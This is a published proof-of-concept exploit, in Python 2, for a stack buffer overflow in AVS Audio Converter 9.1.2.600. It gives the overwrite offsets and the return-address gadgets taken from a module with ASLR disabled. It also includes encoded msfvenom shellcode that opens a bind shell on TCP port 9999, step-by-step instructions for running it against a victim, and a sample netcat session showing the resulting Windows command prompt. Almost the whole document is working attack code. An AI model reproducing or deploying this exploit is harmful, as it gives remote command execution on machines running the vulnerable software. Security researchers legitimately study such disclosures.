# Exploit Title: AVS Audio Converter 9.1.2.600 - Stack Overflow (PoC)
# Date: December 2019-12-28
# Exploit Author: boku
# Original DoS: https://www.exploit-db.com/exploits/47788
# Original DoS Author: ZwX
# Software Vendor: http://www.avs4you.com/
# Software Link: http://www.avs4you.com/avs-audio-converter.aspx
# Version: 9.1.2.600
# Tested on: Microsoft Windows 10 Home 1909(x86-64) - 10.0.18363 N/A Build 18363
#            Microsoft Windows 7 Enterprise(x86-64) - 6.1.7601 Service Pack 1 Build 7601

#!/usr/bin/python
# Recreate:
#   1) Generate the 'bind9999.txt' payload using python 2.7.x on Kali Linux.
#   2) On the victim Windows machine, open the file 'bind9999.txt' with notepad, then Select-All > Copy.
#   3) Install & Open AVS Audio Converter 9.1.2.600.
#   4) Locate the textbox to the right of 'Output Folder:'; at the bottom of the main window.
#   5) Paste the copied payload from the 'bind9999.txt' file into the textbox.
#   6) Click the 'Browse...' button; to the right of the textbox.
#      - The program will freeze & a bind shell will be listening on tcp port 9999; on all interfaces.
# Special thanks to: The Offsec Team, Corelan Team, Vivek/Pentester Academy Team, Skape
blt = '\033[92m[\033[0m+\033[92m]\033[0m ' # bash green success bullet
err = '\033[91m[\033[0m!\033[91m]\033[0m ' # bash red   error   bullet
File = 'bind9999.txt'
try:
    # 0x00400000 [AVSAudioConverter.exe]
    #   9.1.2.600 (C:\Program Files (x86)\AVS4YOU\AVSAudioConverter\AVSAudioConverter.exe)
    #   - The only module that has SafeSEH disabled.
    #   Base       | Top        | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | 
    #   0x00400000 | 0x00f33000 | False  | False   | False |  False   | False  | 
    #   - Attempting a 3-byte SEH-handler overwrite will fail due to no exception being thrown.
    offEdx  = '\x41'*260
    edx     = '\x42\x42\x42\x42' # EDX overwrite at 260 bytes. EDX=0x42424242
    # SEH-Record overwrite at offset 264; the goal from here is to not throw an exception or we're screwed.
    nSEH    = '\x42'*4
    SEH     = '\x43'*4
    # - If address at offset 308 is not readable, then the program will throw an exception at:
    #   75F9ECE7    3806            cmp byte ptr ds:[esi], al
    #   [!] Access violation when reading [esi] 
    # - If we can get past this exception, we can overwrite EIP at offset 304.
    # - [esi] must be successfully overwriten so we can put our payload after it.
    offEip  = '\x45'*32
    # - AVSAudioEditor5.dll is the only other module with both ASLR & Rebase disabled. 
    # - The enabled SafeSEH blocks us from using it for a SEH overwrite, but we can still jump 
    #    to it with a vanilla EIP overwrite; due to overwriting a return address on the stack.
    # - After bypassing the ESI read exception, our stack will look like this after the EIP overwrite:
    #   ECX=0018FA60  ESP=0018FA60 (Stack locations will vary)
    #        0018FA54   45454545  EEEE // [296]
    #        0018FA58   45454545  EEEE // [300]
    #        0018FA5C   1006563E  V... // [304] eip var # Pointer to 'pop+ret'
    #       *0018FA60   00000000  .... // [308] esi var # our esi address gets replaced by 4 nulls
    #        0018FA64   1006A438  8... // [312] jmpEsp var # Pointer to 'jmp esp'
    #        0018FA68   E510EC10  .... // [316] fixStack var # ASM to fix the Stack so shellcode will work
    # [AVSAudioEditor5.dll] (C:\Program Files (x86)\Common Files\AVSMedia\ActiveX\AVSAudioEditor5.dll) 
    #   Base       | Top        | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | 
    #   0x10000000 | 0x100a1000 | False  | True    | False |  False   | False  | 
    # 0x1006563e : pop esi # ret  | ascii {PAGE_EXECUTE_READ} [AVSAudioEditor5.dll]
    eip      = '\x3e\x56\x06\x10' # pop+ret
    # - After pop+ret, ESP=0018FA68
    esi      = '\x10\x10\x08\x10' # [AVSAudioEditor5.dll] | .data | RW
    #   0x1006a438 : jmp esp |  {PAGE_EXECUTE_READ} [AVSAudioEditor5.dll]
    # - the esi var address is just a random, readable memory location that will not move; to bypass the exception.
    jmpEsp   = '\x38\xa4\x06\x10' # jmp esp pointer
    # EBP is 45454545 at this point. Needs to be fixed for most shellcode payloads to work properly.
    fixStack = '\x83\xEC\x10'     # sub esp, 0x10
    fixStack += '\x89\xE5'        # mov ebp, esp
    fixStack += '\x83\xEC\x60'    # sub esp, 0x60
    #msfvenom -p windows/shell_bind_tcp LPORT=9999 -v shellcode -a x86 --platform windows -b '\x00' --format python
    # x86/shikata_ga_nai succeeded with size 355 (iteration=0)
    shellcode =  b""
    shellcode += b"\xbe\xd8\x49\x8d\x72\xd9\xe5\xd9\x74\x24\xf4"
    shellcode += b"\x5a\x31\xc9\xb1\x53\x31\x72\x12\x83\xea\xfc"
    shellcode += b"\x03\xaa\x47\x6f\x87\xb6\xb0\xed\x68\x46\x41"
    shellcode += b"\x92\xe1\xa3\x70\x92\x96\xa0\x23\x22\xdc\xe4"
    shellcode += b"\xcf\xc9\xb0\x1c\x5b\xbf\x1c\x13\xec\x0a\x7b"
    shellcode += b"\x1a\xed\x27\xbf\x3d\x6d\x3a\xec\x9d\x4c\xf5"
    shellcode += b"\xe1\xdc\x89\xe8\x08\x8c\x42\x66\xbe\x20\xe6"
    shellcode += b"\x32\x03\xcb\xb4\xd3\x03\x28\x0c\xd5\x22\xff"
    shellcode += b"\x06\x8c\xe4\xfe\xcb\xa4\xac\x18\x0f\x80\x67"
    shellcode += b"\x93\xfb\x7e\x76\x75\x32\x7e\xd5\xb8\xfa\x8d"
    shellcode += b"\x27\xfd\x3d\x6e\x52\xf7\x3d\x13\x65\xcc\x3c"
    shellcode += b"\xcf\xe0\xd6\xe7\x84\x53\x32\x19\x48\x05\xb1"
    shellcode += b"\x15\x25\x41\x9d\x39\xb8\x86\x96\x46\x31\x29"
    shellcode += b"\x78\xcf\x01\x0e\x5c\x8b\xd2\x2f\xc5\x71\xb4"
    shellcode += b"\x50\x15\xda\x69\xf5\x5e\xf7\x7e\x84\x3d\x90"
    shellcode += b"\xb3\xa5\xbd\x60\xdc\xbe\xce\x52\x43\x15\x58"
    shellcode += b"\xdf\x0c\xb3\x9f\x20\x27\x03\x0f\xdf\xc8\x74"
    shellcode += b"\x06\x24\x9c\x24\x30\x8d\x9d\xae\xc0\x32\x48"
    shellcode += b"\x5a\xc8\x95\x23\x79\x35\x65\x94\x3d\x95\x0e"
    shellcode += b"\xfe\xb1\xca\x2f\x01\x18\x63\xc7\xfc\xa3\xac"
    shellcode += b"\x17\x88\x42\xd8\x37\xdc\xdd\x74\xfa\x3b\xd6"
    shellcode += b"\xe3\x05\x6e\x4e\x83\x4e\x78\x49\xac\x4e\xae"
    shellcode += b"\xfd\x3a\xc5\xbd\x39\x5b\xda\xeb\x69\x0c\x4d"
    shellcode += b"\x61\xf8\x7f\xef\x76\xd1\x17\x8c\xe5\xbe\xe7"
    shellcode += b"\xdb\x15\x69\xb0\x8c\xe8\x60\x54\x21\x52\xdb"
    shellcode += b"\x4a\xb8\x02\x24\xce\x67\xf7\xab\xcf\xea\x43"
    shellcode += b"\x88\xdf\x32\x4b\x94\x8b\xea\x1a\x42\x65\x4d"
    shellcode += b"\xf5\x24\xdf\x07\xaa\xee\xb7\xde\x80\x30\xc1"
    shellcode += b"\xde\xcc\xc6\x2d\x6e\xb9\x9e\x52\x5f\x2d\x17"
    shellcode += b"\x2b\xbd\xcd\xd8\xe6\x05\xfd\x92\xaa\x2c\x96"
    shellcode += b"\x7a\x3f\x6d\xfb\x7c\xea\xb2\x02\xff\x1e\x4b"
    shellcode += b"\xf1\x1f\x6b\x4e\xbd\xa7\x80\x22\xae\x4d\xa6"
    shellcode += b"\x91\xcf\x47"
    payload  = offEdx+edx+nSEH+SEH+offEip+eip+esi+jmpEsp+fixStack+shellcode
    # offsets: 0      260 264  268 272    304 308 312    316      324
    f       = open(File, 'w') # open file for write
    f.write(payload)
    f.close() # close the file
    print blt + File + " created successfully "
#   root@kali# nc <Victim IP> 9999
#   Microsoft Windows [Version 6.1.7601]
#   C:\Program Files (x86)\AVS4YOU\AVSAudioConverter>
except:
    print err + File + ' failed to create'